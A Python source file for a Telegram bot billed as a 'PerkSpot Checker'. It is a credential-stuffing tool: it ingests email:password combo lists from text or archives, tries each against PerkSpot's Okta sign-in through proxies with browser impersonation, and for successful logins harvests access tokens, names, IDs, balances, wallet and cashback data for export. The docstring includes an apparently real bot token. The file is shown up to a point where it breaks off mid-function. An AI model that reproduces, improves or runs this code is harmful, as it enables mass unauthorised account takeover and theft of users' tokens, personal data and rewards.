#!/usr/bin/env python3
"""
PerkSpot Checker Bot - Telegram Edition
=======================================
Full-featured account checker with admin panel,
multi-format support (.txt/.zip/.rar), data capture.

Requirements:
  pip install python-telegram-bot==20.7 curl_cffi rarfile

Setup:
  export BOT_TOKEN="8823280222:AAGNdYYTXeV2uA_8LS4Rz_QviRGrIGV2eaQ"
  export ADMIN_ID="5944410248"  (optional)
  python3 perkspot_bot.py
"""

import asyncio, json, os, re, time, zipfile, logging, tempfile, shutil, hashlib, base64, secrets
from pathlib import Path
from datetime import datetime
from io import BytesIO
from typing import Optional, Dict, List

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, BotCommand
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ConversationHandler, filters, ContextTypes
)
from telegram.constants import ParseMode
from curl_cffi import requests as cffi_requests

# ═══════════════════════════════════════════════════════════════
#  PATHS & CONSTANTS
# ═══════════════════════════════════════════════════════════════
BOT_DIR     = Path.home() / ".perkspot_bot"
CONFIG_FILE = BOT_DIR / "config.json"
RESULTS_DIR = BOT_DIR / "results"
LOG_FILE    = BOT_DIR / "bot.log"

OKTA_ISSUER = "https://perkspot.okta.com"
AUTH_API    = "https://perkspot-api.perkspot.com/authapi"
PS_API      = "https://perkspot-api.perkspot.com/api/v1"

WAIT_ACCOUNT = 1
WAIT_PROXY = 2
WAIT_BROADCAST = 3
WAIT_ADMIN_ID = 4
WAIT_CONCURRENT = 5

# ═══════════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════════
BOT_DIR.mkdir(parents=True, exist_ok=True)
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"), logging.StreamHandler()],
    level=logging.INFO,
)
log = logging.getLogger("perkspot_bot")

# ═══════════════════════════════════════════════════════════════
#  CONFIG MANAGER
# ═══════════════════════════════════════════════════════════════
DEFAULT_CONFIG = {
    "admin_ids": [],
    "proxy": "",
    "allowed_user_ids": [],
    "capture_settings": {
        "balance": True, "wallet": True, "profile": True,
        "rewards": True, "cashback": True, "savings": False,
        "deals": False, "orders": False, "notifications": False, "user_info": True,
    },
    "output_format": "json",
    "max_concurrent": 3,
    "stats": {"checked": 0, "success": 0, "fail": 0},
}


class BotConfig:
    def __init__(self):
        if CONFIG_FILE.exists():
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                self.data = json.load(f)
            for k, v in DEFAULT_CONFIG.items():
                if k not in self.data:
                    self.data[k] = v
            if not isinstance(self.data.get("stats"), dict):
                self.data["stats"] = dict(DEFAULT_CONFIG["stats"])
        else:
            self.data = json.loads(json.dumps(DEFAULT_CONFIG))
        self.save()

    def save(self):
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False)

    @property
    def proxy(self):
        return self.data.get("proxy", "")

    @proxy.setter
    def proxy(self, v):
        self.data["proxy"] = v
        self.save()

    @property
    def admin_ids(self):
        return self.data.get("admin_ids", [])

    def is_admin(self, uid):
        if not self.admin_ids:
            return True
        return uid in self.admin_ids

    def add_admin(self, uid):
        if uid not in self.data["admin_ids"]:
            self.data["admin_ids"].append(uid)
            self.save()

    @property
    def allowed_user_ids(self):
        return self.data.get("allowed_user_ids", [])

    def is_allowed(self, uid):
        if not self.allowed_user_ids:
            return True
        return uid in self.allowed_user_ids

    def add_user(self, uid):
        ids = self.data.setdefault("allowed_user_ids", [])
        if uid not in ids:
            ids.append(uid)
            self.save()

    def remove_user(self, uid):
        ids = self.data.get("allowed_user_ids", [])
        if uid in ids:
            ids.remove(uid)
            self.save()

    @property
    def capture_settings(self):
        return self.data.get("capture_settings", dict(DEFAULT_CONFIG["capture_settings"]))

    def toggle_capture(self, key):
        s = self.data.setdefault("capture_settings", dict(DEFAULT_CONFIG["capture_settings"]))
        s[key] = not s.get(key, False)
        self.save()
        return s[key]

    @property
    def output_format(self):
        return self.data.get("output_format", "json")

    @output_format.setter
    def output_format(self, v):
        self.data["output_format"] = v
        self.save()

    @property
    def max_concurrent(self):
        return self.data.get("max_concurrent", 3)

    @max_concurrent.setter
    def max_concurrent(self, v):
        self.data["max_concurrent"] = max(1, min(10, v))
        self.save()

    def inc_stat(self, success):
        s = self.data.setdefault("stats", {"checked": 0, "success": 0, "fail": 0})
        s["checked"] += 1
        s["success" if success else "fail"] += 1
        self.save()

    def reset_stats(self):
        self.data["stats"] = {"checked": 0, "success": 0, "fail": 0}
        self.save()


# ═══════════════════════════════════════════════════════════════
#  PERKSPOT CHECKER CORE
# ═══════════════════════════════════════════════════════════════
CAPTURE_ENDPOINTS = {
    "balance": f"{PS_API}/balance",
    "wallet": f"{PS_API}/wallet",
    "profile": f"{PS_API}/profile",
    "rewards": f"{PS_API}/rewards",
    "cashback": f"{PS_API}/cashback",
    "savings": f"{PS_API}/savings",
    "deals": f"{PS_API}/deals",
    "orders": f"{PS_API}/orders",
    "user_info": f"{PS_API}/user",
    "me": f"{PS_API}/me",
    "account": f"{PS_API}/account",
    "settings": f"{PS_API}/settings",
    "notifications": f"{PS_API}/notifications",
    "history": f"{PS_API}/history",
}


def check_single_account(email, password, proxy="", capture_settings=None):
    result = {
        "account": f"{email}:{password}",
        "email": email,
        "status": "fail",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "method": None,
        "data": {},
    }
    try:
        kw = {"impersonate": "chrome"}
        if proxy:
            kw["proxy"] = proxy
        s = cffi_requests.Session(**kw)

        r = s.post(
            f"{OKTA_ISSUER}/api/v1/authn",
            json={"username": email, "password": password},
            timeout=20,
            headers={"Accept": "application/json", "Content-Type": "application/json"},
        )
        if r.status_code != 200:
            result["data"]["error"] = f"Okta {r.status_code}: {r.text[:150]}"
            return result

        data = r.json()
        if data.get("status") != "SUCCESS":
            result["data"]["error"] = f"Auth status: {data.get('status')}"
            return result

        user = data.get("_embedded", {}).get("user", {})
        profile = user.get("profile", {})
        result["status"] = "success"
        result["method"] = "okta"
        result["data"]["user"] = {
            "id": user.get("id"),
            "email": profile.get("login", email),
            "first_name": profile.get("firstName", ""),
            "last_name": profile.get("lastName", ""),
            "timezone": profile.get("timeZone", ""),
        }

        # Try PKCE for tokens + data capture
        try:
            verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()
            challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
            s.headers.update({
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Origin": "https://signin.perkspot.com",
                "Referer": "https://signin.perkspot.com/",
            })
            r1 = s.post(f"{AUTH_API}/api/signin/begin",
                        json={"CodeChallenge": challenge, "State": "state-xyz"}, timeout=20)
            if r1.status_code == 200:
                handle = r1.text
                r2 = s.post(f"{AUTH_API}/api/signin/authenticate",
                            json={"Username": email, "Password": password,
                                  "InteractionHandle": handle, "CodeVerifier": verifier}, timeout=20)
                if r2.status_code == 200:
                    try:
                        tokens = r2.json()
                        result["data"]["tokens"] = {k: v for k, v in tokens.items() if "token" in k.lower()}
                        result["method"] = "okta+pkce"

                        capture_settings = capture_settings or {}
                        at = tokens.get("access_token") or tokens.get("accessToken")
                        headers = {"Accept": "application/json"}
                        if at:
                            headers["Authorization"] = f"Bearer {at}"
                        captured = {}
                        for key, url in CAPTURE_ENDPOINTS.items():
                            if not capture_settings.get(key, False):
                                continue
                            try:
                                cr = s.get(url, headers=headers, timeout=15)
                                if cr.status_code == 200 and "json" in cr.headers.get("content-type", ""):
                                    try:
                                        captured[key] = cr.json()
                                    except:
                                        captured[key] = cr.text[:2000]
                            except:
                                pass
                        if captured:
                            result["data"]["captured"] = captured
                    except:
                        pass
        except Exception as e:
            log.debug(f"PKCE failed for {email}: {e}")
    except Exception as e:
        result["data"]["error"] = str(e)
    return result


# ═══════════════════════════════════════════════════════════════
#  ACCOUNT PARSERS
# ═══════════════════════════════════════════════════════════════
def parse_accounts(text):
    accounts = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        for sep in [":", "|", ";", ","]:
            if sep in line:
                parts = line.split(sep, 1)
                email, pwd = parts[0].strip(), parts[1].strip()
                if "@" in email and "." in email.split("@")[-1]:
                    accounts.append((email, pwd))
                    break
    return accounts


def extract_zip(file_bytes):
    accounts = []
    with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
        for name in zf.namelist():
            if name.endswith((".txt", ".csv", ".text")):
                content = zf.read(name).decode("utf-8", errors="ignore")
                accounts.extend(parse_accounts(content))
            elif name.endswith(".zip"):
                accounts.extend(extract_zip(zf.read(name)))
    return accounts


def extract_rar(file_path):
    import rarfile
    accounts = []
    with rarfile.RarFile(file_path) as rf:
        for name in rf.namelist():
            if name.endswith((".txt", ".csv", ".text")):
                content = rf.read(name).decode("utf-8", errors="ignore")
                accounts.extend(parse_accounts(content))
    return accounts


# ═══════════════════════════════════════════════════════════════
#  RESULTS MANAGER
# ═══════════════════════════════════════════════════════════════
class ResultsManager:
    def __init__(self):
        self.results = []
        self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")

    async def add(self, r):
        self.results.append(r)

    async def clear(self):
        self.results.clear()
        self.batch_id = datetime.now().strftime("%Y%m%d_%H%M%S")

    @property
    def total(self):
        return len(self.results)

    @property
    def success_count(self):
        return sum(1 for r in self.results if r["status"] == "success")

    @property
    def fail_count(self):
        return self.total - self.success_count

    def summary_text(self):
        if not self.results:
            return "No results yet. Check some accounts first!"
        pct = (self.success_count / self.total * 100) if self.total else 0
        return (
            f"Session Results\n\n"
            f"  Batch: {self.batch_id}\n"
            f"  Total: {self.total}\n"
            f"  Success: {self.success_count}\n"
            f"  Failed: {self.fail_count}\n"
            f"  Rate: {pct:.1f}%"
        )

    def to_txt(self):
        lines = [
            "=" * 50,
            "  PERKSPOT CHECKER RESULTS",
            f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Batch: {self.batch_id}",
            "=" * 50,
            f"  Total: {self.total} | Success: {self.success_count} | Failed: {self.fail_count}",
            "=" * 50, "",
        ]
        for i, r in enumerate(self.results, 1):
            lines.append(f"--- Account #{i} ---")
            if r["status"] == "success":
                lines.append(f"  Status: SUCCESS")
                lines.append(f"  Email: {r['email']}")
                u = r.get("data", {}).get("user", {})
                if u:
                    name = f"{u.get('first_name', '')} {u.get('last_name', '')}".strip()
                    lines.append(f"  Name: {name or 'N/A'}")
                    lines.append(f"  User ID: {u.get('id', 'N/A')}")
                cap = r.get("data", {}).get("captured", {})
                for key, val in cap.items():
                    if isinstance(val, dict):
                        for bk in ["available", "balance", "amount", "total", "pending",
                                   "cashbackAmount", "currentBalance"]:
                            if bk in val:
                                lines.append(f"  {key}.{bk}: {val[bk]}")
                        if isinstance(val, list):
                            lines.append(f"  {key}: {len(val)} items")
                    elif isinstance(val, str):
                        lines.append(f"  {key}: {val[:200]}")
                lines.append(f"  Method: {r.get('method', 'N/A')}")
            else:
                lines.append(f"  Status: FAILED")
                lines.append(f"  Email: {r['email']}")
                err = r.get("data", {}).get("error", "Unknown error")
                lines.append(f"  Error: {err}")
            lines.append(f"  Time: {r.get('timestamp', 'N/A')}")
            lines.append("-" * 40)
            lines.append("")
        return "\n".join(lines)

    def to_json_str(self):
        return json.dumps(self.results, indent=2, ensure_ascii=False, default=str)

    def to_zip_bytes(self):
        buf = BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"perkspot_{self.batch_id}.txt", self.to_txt())
            zf.writestr(f"perkspot_{self.batch_id}.json", self.to_json_str())
        buf.seek(0)
        return buf

    def format_single(self, r):
        if r["status"] == "success":
            u = r.get("data", {}).get("user", {})
            name = f"{u.get('first_name', '')} {u.get('last_name', '')}".strip()
            msg = f"\u2705 LOGIN SUCCESS\n\n"
            msg += f"  Email: {r['email']}\n"
            if name:
                msg += f"  Name: {name}\n"
            if u.get("id"):
                msg += f"  ID: {u.get('id')}\n"
            msg += f"  Method: {r.get('method', 'N/A')}\n"
            cap = r.get("data", {}).get("captured", {})
            if cap:
                msg += f"\n  Captured Data:\n"
                for key, val in cap.items():
                    if isinstance(val, dict):
                        important = {}
                        for bk in ["available", "balance", "amount", "total", "pending",
                                   "cashbackAmount", "currentBalance", "lifetimeSavings",
                                   "earned", "redeemed", "availableCashback"]:
                            if bk in val:
                                important[bk] = val[bk]
                        if important:
                            items = " | ".join(f"{k}: {v}" for k, v in important.items())
                            msg += f"    {key}: {items}\n"
                        elif isinstance(val, list):
                            msg += f"    {key}: {len(val)} items\n"
                        else:
                            msg += f"    {key}: captured\n"
                    elif isinstance(val, str):
                        msg += f"    {key}: {val[:100]}\n"
            return msg
        else:
            err = r.get("data", {}).get("error", "Unknown error")
            return f"\u274c LOGIN FAILED\n\n  Email: {r['email']}\n  Error: {err}"


# ═══════════════════════════════════════════════════════════════
#  KEYBOARD BUILDERS
# ═══════════════════════════════════════════════════════════════
def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("\U0001f50d  Check Account", callback_data="check_single"),
         InlineKeyboardButton("\U0001f4c1  Upload File", callback_data="check_file")],
        [InlineKeyboardButton("\U0001f4ca  Results", callback_data="results_menu"),
         InlineKeyboardButton("\u2699\ufe0f  Settings", callback_data="settings_menu")],
        [InlineKeyboardButton("\U0001f511  Admin Panel", callback_data="admin_menu")],
    ])


def results_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Summary", callback_data="results_summary"),
         InlineKeyboardButton("Last 5", callback_data="results_last5")],
        [InlineKeyboardButton("\U0001f4c4  .TXT", callback_data="results_download_txt"),
         InlineKeyboardButton("\U0001f4cb  .JSON", callback_data="results_download_json"),
         InlineKeyboardButton("\U0001f4e6  .ZIP", callback_data="results_download_zip")],
        [InlineKeyboardButton("Clear All", callback_data="results_clear"),
         InlineKeyboardButton("Main Menu", callback_data="menu_main")],
    ])


def settings_menu_kb(c):
    caps = c.capture_settings
    btns = []
    row = []
    i = 0
    labels = [
        ("balance", "Balance"), ("wallet", "Wallet"), ("profile", "Profile"),
        ("user_info", "User Info"), ("rewards", "Rewards"), ("cashback", "Cashback"),
        ("savings", "Savings"), ("deals", "Deals"), ("orders", "Orders"),
        ("notifications", "Notifications"),
    ]
    for key, label in labels:
        icon = "\u2705" if caps.get(key, False) else "\u2b1c"
        row.append(InlineKeyboardButton(f"{icon} {label}", callback_data=f"cap_{key}"))
        i += 1
        if i % 2 == 0:
            btns.append(row)
            row = []
    if row:
        btns.append(row)
    fmt_map = {"txt": ".TXT", "json": ".JSON", "zip": ".ZIP"}
    btns.append([InlineKeyboardButton(
        f"Format: {fmt_map.get(c.output_format, c.output_format).upper()}",
        callback_data="cycle_format")])
    btns.append([InlineKeyboardButton("Reset Defaults", callback_data="settings_reset"),
                 InlineKeyboardButton("Main Menu", callback_data="menu_main")])
    return InlineKeyboardMarkup(btns)


def admin_menu_kb(c):
    proxy_st = "\U0001f7e2 Set" if c.proxy else "\U0001f534 None"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"Proxy: {proxy_st}", callback_data="admin_proxy")],
        [InlineKeyboardButton(f"Concurrent: {c.max_concurrent}", callback_data="admin_concurrent"),
         InlineKeyboardButton("Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("Set Admin ID", callback_data="admin_setid")],
        [InlineKeyboardButton("User Management", callback_data="admin_users")],
        [InlineKeyboardButton("Reset Stats", callback_data="admin_reset_stats"),
         InlineKeyboardButton("Main Menu", callback_data="menu_main")],
    ])


def admin_users_kb(c):
    btns = [[InlineKeyboardButton("Back to Admin", callback_data="admin_menu")]]
    return InlineKeyboardMarkup(btns)


# ═══════════════════════════════════════════════════════════════
#  HELPER: get config & results from bot_data
# ═══════════════════════════════════════════════════════════════
def get_cfg(update):
    return update.get_bot().get_bot_data()["config"]


def get_rm(update):
    return update.get_bot().get_bot_data()["results"]


def get_bot_data(update):
    return update.get_bot().get_bot_data()


# ═══════════════════════════════════════════════════════════════
#  CHECKING ENGINE
# ═══════════════════════════════════════════════════════════════
async def run_check(update, ctx, accounts):
    uid = update.effective_user.id
    c = get_cfg(update)
    rm = get_rm(update)
    bd = get_bot_data(update)

    if uid in bd.get("checking", set()):
        await update.effective_message.reply_text("You already have a check running. Please wait.")
        return

    bd.setdefault("checking", set()).add(uid)
    total = len(accounts)
    sem = asyncio.Semaphore(c.max_concurrent)

    progress_msg = await update.effective_message.reply_text(
        f"Checking {total} account(s)...\n\nProgress: 0/{total}")

    checked = [0]

    async def check_one(email, pwd):
        async with sem:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None, check_single_account, email, pwd, c.proxy, c.capture_settings)
            await rm.add(result)
            c.inc_stat(result["status"] == "success")
            checked[0] += 1
            if checked[0] <= 20 or checked[0] % 5 == 0 or checked[0] == total:
                try:
                    await progress_msg.edit_text(
                        f"Checking {total} account(s)...\n\n"
                        f"Progress: {checked[0]}/{total}\n"
                        f"Success: {rm.success_count} | Failed: {rm.fail_count}")
                except:
                    pass
            return result

    tasks = [check_one(e, p) for e, p in accounts]
    await asyncio.gather(*tasks, return_exceptions=True)

    bd["checking"].discard(uid)

    succ = rm.success_count
    fail = rm.fail_count
    pct = (succ / total * 100) if total else 0
    summary = (
        f"Check Complete!\n\n"
        f"  Total: {total}\n"
        f"  Success: {succ}\n"
        f"  Failed: {fail}\n"
        f"  Rate: {pct:.1f}%\n\n"
        f"Use /results to view details."
    )

    recent = rm.results[-3:]
    if recent:
        summary += "\n\nRecent:\n"
        for r in recent:
            icon = "\u2705" if r["status"] == "success" else "\u274c"
            summary += f"  {icon} {r['email']}\n"

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("View Results", callback_data="results_menu"),
         InlineKeyboardButton("Download .ZIP", callback_data="results_download_zip")],
        [InlineKeyboardButton("Main Menu", callback_data="menu_main")],
    ])
    try:
        await progress_msg.edit_text(summary, reply_markup=kb)
    except:
        await update.effective_message.reply_text(summary, reply_markup=kb)

    # Save to disk
    try:
        fpath = RESULTS_DIR / f"results_{rm.batch_id}.json"
        with open(fpath, "w", encoding="utf-8") as f:
            json.dump(rm.results, f, indent=2, ensure_ascii=False, default=str)
        log.info(f"Results saved to {fpath}")
    except Exception as e:
        log.error(f"Save failed: {e}")


# ═══════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════
async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Main menu"),
        BotCommand("check", "Check email:pass"),
        BotCommand("results", "View results"),
        BotCommand("settings", "Capture settings"),
        BotCommand("admin", "Admin panel"),
    ])


async def cmd_start(update, ctx):
    c = get_cfg(update)
    proxy_info = c.proxy or "None"
    welcome = (
        f"PerkSpot Checker Bot\n\n"
        f"Supported formats:\n"
        f"  email:pass (paste or file)\n"
        f"  .txt files (one per line)\n"
        f"  .zip / .rar (archives with .txt inside)\n\n"
        f"Current proxy: {proxy_info}\n\n"
        f"Use the menu below to get started."
    )
    await update.message.reply_text(welcome, reply_markup=main_menu_kb())


async def cmd_check(update, ctx):
    if not ctx.args:
        await update.message.reply_text(
            "Send: /check email:pass\n\nOr use the menu.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data="menu_main")]]))
        return
    raw = " ".join(ctx.args)
    accounts = parse_accounts(raw)
    if not accounts:
        await update.message.reply_text("Could not parse email:pass from input.")
        return
    await run_check(update, ctx, accounts)


async def cmd_results(update, ctx):
    rm = get_rm(update)
    await update.message.reply_text(rm.summary_text(), reply_markup=results_menu_kb())


async def cmd_settings(update, ctx):
    c = get_cfg(update)
    await update.message.reply_text("Capture Settings\n\nToggle what data to capture:", reply_markup=settings_menu_kb(c))


async def cmd_admin(update, ctx):
    c = get_cfg(update)
    uid = update.effective_user.id
    if not c.is_admin(uid):
        await update.message.reply_text("Admin only.")
        return
    await update.message.reply_text("Admin Panel", reply_markup=admin_menu_kb(c))


# ═══════════════════════════════════════════════════════════════
#  CALLBACK HANDLER (all inline buttons)
# ═══════════════════════════════════════════════════════════════
async def callback_handler(update, ctx):
    query = update.callback_query
    await query.answer()
    data = query.data
    c = get_cfg(update)
    rm = get_rm(update)
    uid = update.effective_user.id
    bd = get_bot_data(update)

    # ── Main Menu ──
    if data == "menu_main":
        proxy_info = c.proxy or "None"
        await query.edit_message_text(
            f"PerkSpot Checker Bot\n\nProxy: {proxy_info}\n\nUse the menu below:",
            reply_markup=main_menu_kb())

    # ── Check Single ──
    elif data == "check_single":
        bd["state"] = WAIT_ACCOUNT
        await query.edit_message_text(
            "Check Account\n\n"
            "Send account in any format:\n"
            "  email:pass\n"
            "  email|pass\n"
            "  email;pass\n"
            "  email,pass\n\n"
            "Or send a .txt / .zip / .rar file.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="menu_main")]]))

    # ── Check File ──
    elif data == "check_file":
        bd["state"] = WAIT_ACCOUNT
        await query.edit_message_text(
            "Upload File\n\n"
            "Send a file with accounts:\n"
            "  .txt  - one email:pass per line\n"
            "  .zip  - archive containing .txt files\n"
            "  .rar  - archive containing .txt files\n\n"
            "Supported separators: : | ; ,",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="menu_main")]]))

    # ── Results Menu ──
    elif data == "results_menu":
        await query.edit_message_text(rm.summary_text(), reply_markup=results_menu_kb())

    elif data == "results_summary":
        txt = rm.summary_text()
        if rm.results:
            txt += "\n\nDetails:\n"
            for r in rm.results:
                icon = "\u2705" if r["status"] == "success" else "\u274c"
                txt += f"\n{icon} {r['email']}"
                if r["status"] == "success":
                    u = r.get("data", {}).get("user", {})
                    name = f"{u.get('first_name', '')} {u.get('last_name', '')}".strip()
                    if name:
                        txt += f" ({name})"
        await query.edit_message_text(txt, reply_markup=results_menu_kb())

    elif data == "results_last5":
        last5 = rm.results[-5:] if rm.results else []
        if not last5:
            await query.edit_message_text("No results yet.", reply_markup=results_menu_kb())
            return
        txt = "Last 5 Results:\n\n"
        for r in last5:
            txt += rm.format_single(r) + "\n\n"
        await query.edit_message_text(txt[:4000], reply_markup=results_menu_kb())

    elif data == "results_download_txt":
        if not rm.results:
            await query.edit_message_text("No results to download.", reply_markup=results_menu_kb())
            return
        txt_bytes = rm.to_txt().encode("utf-8")
        await query.message.reply_document(
            document=InputFile(BytesIO(txt_bytes), filename=f"perkspot_{rm.batch_id}.txt"),
            caption=f"Results: {rm.total} accounts ({rm.success_count} success)")

    elif data == "results_download_json":
        if not rm.results:
            await query.edit_message_text("No results to download.", reply_markup=results_menu_kb())
            return
        json_bytes = rm.to_json_str().encode("utf-8")
        await query.message.reply_document(
            document=InputFile(BytesIO(json_bytes), filename=f"perkspot_{rm.batch_id}.json"),
            caption=f"Results: {rm.total} accounts ({rm.success_count} success)")

    elif data == "results_download_zip":
        if not rm.results:
            await query.edit_message_text("No results to download.", reply_markup=results_menu_kb())
            return
        zip_buf = rm.to_zip_bytes()
        await query.message.reply_document(
            document=InputFile(zip_buf, filename=f"perkspot_{rm.batch_id}.zip"),
            caption=f"Results: {rm.total} accounts ({rm.success_count} success)")

    elif data == "results_clear":
        await rm.clear()
        await query.edit_message_text("Results cleared.", reply_markup=results_menu_kb())

    # ── Settings ──
    elif data == "settings_menu":
        await query.edit_message_text("Capture Settings\n\nToggle what data to capture:",
                                       reply_markup=settings_menu_kb(c))

    elif data.startswith("cap_"):
        key = data[4:]
        val = c.toggle_capture(key)
        label = key.replace("_", " ").title()
        status = "ON" if val else "OFF"
        log.info(f"User {uid} toggled {key} -> {val}")
        await query.edit_message_text(f"Capture Settings\n\n{label}: {status}",
                                       reply_markup=settings_menu_kb(c))

    elif data == "cycle_format":
        fmts = ["json", "txt", "zip"]
        idx = fmts.index(c.output_format) if c.output_format in fmts else 0
        c.output_format = fmts[(idx + 1) % len(fmts)]
        await query.edit_message_text(f"Output Format: {c.output_format.upper()}",
                                       reply_markup=settings_menu_kb(c))

    elif data == "settings_reset":
        c.data["capture_settings"] = dict(DEFAULT_CONFIG["capture_settings"])
        c.data["output_format"] = "json"
        c.save()
        await query.edit_message_text("Settings reset to defaults.",
                                       reply_markup=settings_menu_kb(c))

    # ── Admin ──
    elif data == "admin_menu":
        if not c.is_admin(uid):
            await query.edit_message_text("Admin only.", reply_markup=main_menu_kb())
            return
        await query.edit_message_text("Admin Panel", reply_markup=admin_menu_kb(c))

    elif data == "admin_proxy":
        if not c.is_admin(uid):
            return
        bd["state"] = WAIT_PROXY
        current = c.proxy or "None"
        await query.edit_message_text(
            f"Set Proxy\n\nCurrent: {current}\n\n"
            "Send proxy in format:\n"
            "  http://user:pass@host:port\n"
            "  OR  host:port:user:pass\n\n"
            "Send 'none' to remove proxy.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="admin_menu")]]))

    elif data == "admin_concurrent":
        if not c.is_admin(uid):
            return
        bd["state"] = WAIT_CONCURRENT
        await query.edit_message_text(
            f"Set Max Concurrent\n\nCurrent: {c.max_concurrent}\n\n"
            "Send a number (1-10):",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="admin_menu")]]))

    elif data == "admin_stats":
        if not c.is_admin(uid):
            return
        st = c.data.get("stats", {})
        txt = (
            f"Bot Statistics\n\n"
            f"  Total Checked: {st.get('checked', 0)}\n"
            f"  Success: {st.get('success', 0)}\n"
            f"  Failed: {st.get('fail', 0)}\n"
            f"  Rate: {(st.get('success', 0) / st.get('checked', 1) * 100):.1f}%\n\n"
            f"  Session Results: {rm.total}\n"
            f"  Admins: {c.admin_ids}\n"
            f"  Allowed Users: {c.allowed_user_ids}\n"
            f"  Proxy: {c.proxy or 'None'}\n"
            f"  Concurrent: {c.max_concurrent}"
        )
        await query.edit_message_text(txt, reply_markup=admin_menu_kb(c))

    elif data == "admin_broadcast":
        if not c.is_admin(uid):
            return
        bd["state"] = WAIT_BROADCAST
        await query.edit_message_text(
            "Broadcast Message\n\nSend the message to broadcast to all users.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="admin_menu")]]))

    elif data == "admin_setid":
        if not c.is_admin(uid):
            return
        bd["state"] = WAIT_ADMIN_ID
        await query.edit_message_text(
            f"Set Admin ID\n\nCurrent admins: {c.admin_ids}\n\n"
            "Send your Telegram user ID.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Cancel", callback_data="admin_menu")]]))

    elif data == "admin_users":
        if not c.is_admin(uid):
            return
        users = c.allowed_user_ids
        txt = f"User Management\n\nAllowed Users ({len(users)}):\n"
        for u in users:
            txt += f"  - {u}\n"
        if not users:
            txt += "  (all users allowed)\n"
        txt += "\nSend user ID to add/remove.\nSend 'clear' to allow all."
        bd["state"] = WAIT_ADMIN_ID
        await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Back", callback_data="admin_menu")]]))

    elif data == "admin_reset_stats":
        if not c.is_admin(uid):
            return
        c.reset_stats()
        await query.edit_message_text("Statistics reset.", reply_markup=admin_menu_kb(c))


# ═══════════════════════════════════════════════════════════════
#  MESSAGE HANDLER (text + files)
# ═══════════════════════════════════════════════════════════════
async def message_handler(update, ctx):
    bd = get_bot_data(update)
    c = get_cfg(update)
    uid = update.effective_user.id
    state = bd.get("state")
    text = update.message.text or ""

    # ── Waiting for account input ──
    if state == WAIT_ACCOUNT:
        bd["state"] = None
        accounts = parse_accounts(text)
        if accounts:
            await run_check(update, ctx, accounts)
        else:
            await update.message.reply_text("Could not parse email:pass. Try again or /start")
        return

    # ── Waiting for proxy ──
    elif state == WAIT_PROXY:
        bd["state"] = None
        if text.strip().lower() == "none":
            c.proxy = ""
            await update.message.reply_text(f"Proxy removed.", reply_markup=admin_menu_kb(c))
            return
        proxy = text.strip()
        # Convert host:port:user:pass format
        if not proxy.startswith("http"):
            parts = proxy.split(":")
            if len(parts) == 4:
                proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        c.proxy = proxy
        log.info(f"Proxy set by admin {uid}: {proxy}")
        await update.message.reply_text(f"Proxy set to:\n{proxy}", reply_markup=admin_menu_kb(c))
        return

    # ── Waiting for broadcast ──
    elif state == WAIT_BROADCAST:
        bd["state"] = None
        if not c.is_admin(uid):
            return
        msg = text.strip()
        sent = 0
        # Send to all known users from results or allowed list
        targets = set(c.allowed_user_ids)
        # Add all users who've ever used the bot (from results files)
        try:
            for f in RESULTS_DIR.glob("*.json"):
                try:
                    data = json.loads(f.read_text())
                    # Try to find user IDs stored
                except:
                    pass
        except:
            pass
        if targets:
            for t in targets:
                try:
                    await update.get_bot().send_message(chat_id=t, text=f"Broadcast:\n\n{msg}")
                    sent += 1
                except:
                    pass
        await update.message.reply_text(f"Broadcast sent to {sent} users.", reply_markup=admin_menu_kb(c))
        return

    # ── Waiting for admin ID ──
    elif state == WAIT_ADMIN_ID:
        bd["state"] = None
        if text.strip().lower() == "clear":
            c.data["allowed_user_ids"] = []
            c.save()
            await update.message.reply_text("User list cleared. All users allowed.", reply_markup=admin_menu_kb(c))
            return
        try:
            tid = int(text.strip())
            c.add_admin(tid)
            await update.message.reply_text(f"Admin ID set: {tid}", reply_markup=admin_menu_kb(c))
        except ValueError:
            await update.message.reply_text("Send a valid numeric user ID.", reply_markup=admin_menu_kb(c))
        return

    # ── Waiting for concurrent setting ──
    elif state == WAIT_CONCURRENT:
        bd["state"] = None
        try:
